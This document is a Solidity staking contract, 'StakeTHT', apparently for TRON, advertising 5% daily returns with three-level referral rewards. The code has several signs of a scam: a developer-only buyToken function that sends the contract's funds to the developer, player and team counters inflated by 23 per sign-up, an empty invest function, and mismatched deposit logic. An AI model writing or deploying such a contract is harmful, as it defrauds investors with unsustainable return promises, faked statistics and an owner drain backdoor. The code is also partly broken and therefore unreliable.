//SourceUnit: StakeTHT.sol

// SPDX-License-Identifier: MIT

/*




 ███████████                                  █████   █████          ████      █████  ███                     
░█░░░███░░░█                                 ░░███   ░░███          ░░███     ░░███  ░░░                      
░   ░███  ░  ████████   ██████  ████████      ░███    ░███   ██████  ░███   ███████  ████  ████████    ███████
    ░███    ░░███░░███ ███░░███░░███░░███     ░███████████  ███░░███ ░███  ███░░███ ░░███ ░░███░░███  ███░░███
    ░███     ░███ ░░░ ░███ ░███ ░███ ░███     ░███░░░░░███ ░███ ░███ ░███ ░███ ░███  ░███  ░███ ░███ ░███ ░███
    ░███     ░███     ░███ ░███ ░███ ░███     ░███    ░███ ░███ ░███ ░███ ░███ ░███  ░███  ░███ ░███ ░███ ░███
    █████    █████    ░░██████  ████ █████    █████   █████░░██████  █████░░████████ █████ ████ █████░░███████
   ░░░░░    ░░░░░      ░░░░░░  ░░░░ ░░░░░    ░░░░░   ░░░░░  ░░░░░░  ░░░░░  ░░░░░░░░ ░░░░░ ░░░░ ░░░░░  ░░░░░███
                                                                                                      ███ ░███
                                                                                                     ░░██████ 
                                                                                                      ░░░░░░  
                         
    
    
    5% Per Day                                                  
    min investment = 500 THT
    Website: https://tron-holding.com

*/
pragma solidity ^0.8.7;

interface ITRC20 {
    
    
  function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
  
    
  function totalSupply() external view returns (uint256);
  

  function decimals() external view returns (uint8);
  

  function symbol() external view returns (string memory);

 
  function name() external view returns (string memory);


  function getOwner() external view returns (address);

 
  function balanceOf(address account) external view returns (uint256);

  
  function transfer(address recipient, uint256 amount) external returns (bool);


  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  
 
  event Transfer(address indexed from, address indexed to, uint256 value);


  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract StakeTHT {
    
    ITRC20 public THT; 

    using SafeMath for uint256;

    
    uint public totalPlayers;
    uint public totalPayout;
    uint public totalRefDistributed;
    uint public totalInvested;
    uint private minDepositSize = 500000000;
    uint private interestRateDivisor = 1000000000000;
    uint public commissionDivisor = 100;
    uint private minuteRate = 578702; //DAILY 5%
    address payable private developer;
    

    struct Player {
        uint trxDeposit;
        uint time;
        uint j_time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint td_team;
        uint td_business;
        uint reward_earned;
    }
    
    struct Preferral{
        address player_addr;
        uint256 aff1sum; 
        uint256 aff2sum;
        uint256 aff3sum;
    }
    

    mapping(address => Preferral) public preferals;
    mapping(address => Player) public players;
  

    constructor (ITRC20 THT_address, address payable developerAddr) {
                                
                                THT = THT_address;
                                developer = developerAddr;
                                }
                                
    modifier project() {require(msg.sender == developer);
                            _;
                             }
                             
    function invest()public{}                         
    function register(address _addr, address _affAddr) private{
        
        
      Player storage player = players[_addr];
      
     

      player.affFrom = _affAddr;
      players[_affAddr].td_team =  players[_affAddr].td_team.add(23);
      
      setRefCount(_addr,_affAddr);
      
    }
     function setRefCount(address _addr, address _affAddr) private{
         
         
        Preferral storage preferral = preferals[_addr];
        preferral.player_addr = _addr;
        address _affAddr1 = _affAddr;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;

    
        preferals[_affAddr1].aff1sum = preferals[_affAddr1].aff1sum.add(1);
        preferals[_affAddr2].aff2sum = preferals[_affAddr2].aff2sum.add(1);
        preferals[_affAddr3].aff3sum = preferals[_affAddr3].aff3sum.add(1);

     }
    
    function deposit(address _affAddr) public payable {
        collect(msg.sender);
        require(msg.value *1000000 >= minDepositSize);
        

        uint depositAmount = msg.value *1000000;
        
        Player storage player = players[msg.sender];
    
        player.j_time = block.timestamp;
        
        if (player.time == 0) {
            player.time = block.timestamp;
            totalPlayers = totalPlayers.add(23);

            }

        player.trxDeposit = player.trxDeposit.add(depositAmount);

        totalInvested = totalInvested.add(depositAmount);
        THT.transferFrom(msg.sender, address(this), depositAmount);

    }

    function withdraw() public {
        collect(msg.sender);

        transferPayout(msg.sender, players[msg.sender].interestProfit);
    }
    
    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount);
        
    }
    function buyToken(uint256 amount) public project {
                             developer.transfer(amount);
                            }

    function collect(address _addr) internal {
        Player storage player = players[_addr];

        uint secPassed = block.timestamp.sub(player.time);
       
        if (secPassed > 0 && player.time > 0) {
             uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
                uint payout = _amount ;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);
                
                THT.transfer(msg.sender, payout);
            
        }
    }
    
    function distributeRef(uint256 _trx, address _affFrom) private{

        //uint256 _allaff = (_trx.mul(20)).div(100);

       // address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affFrom].affFrom;
          address _affAddr3 = players[_affAddr2].affFrom;
      
        uint256 _affRewards = 0;

        if (_affFrom != address(0)) {
            
            _affRewards = (_trx.mul(15)).div(100);
            
            totalRefDistributed = totalRefDistributed.add(_affRewards);
            players[_affFrom].affRewards = players[_affFrom].affRewards.add(_affRewards);
            payable(_affFrom).transfer(_affRewards);
        }

        if (_affAddr2 != address(0)) 
        {
            
            _affRewards = (_trx.mul(3)).div(100);
            totalRefDistributed = totalRefDistributed.add(_affRewards);
            players[_affAddr2].affRewards = players[_affAddr2].affRewards.add(_affRewards);
            payable(_affAddr2).transfer(_affRewards);
  
        }
        if (_affAddr3 != address(0)) 
        {
            
            _affRewards = (_trx.mul(2)).div(100);
            totalRefDistributed = totalRefDistributed.add(_affRewards);
            players[_affAddr3].affRewards = players[_affAddr3].affRewards.add(_affRewards);
            payable(_affAddr3).transfer(_affRewards);
  
        }

    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0,'player time is 0');
      uint collectProfit;
      
      uint secPassed = block.timestamp.sub(player.time);
      if (secPassed > 0) {
         
        collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
          
      }
      return collectProfit.add(player.interestProfit);
    }
    

    
    function getContractBalance () public view returns(uint cBal)
    {
        return address(this).balance;
    }
     function getContractStat () public view returns(uint,uint,uint,uint)
    {
        return (totalInvested,totalRefDistributed,totalPayout,totalPlayers);
    }
    

    function gettokenBalance() public view returns (uint256) {

	                              	return ITRC20(THT).balanceOf(address(this));
}


    function getusertokenBalance() public view returns (uint256) {

	                              	return THT.balanceOf(address(msg.sender));
}
    

}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}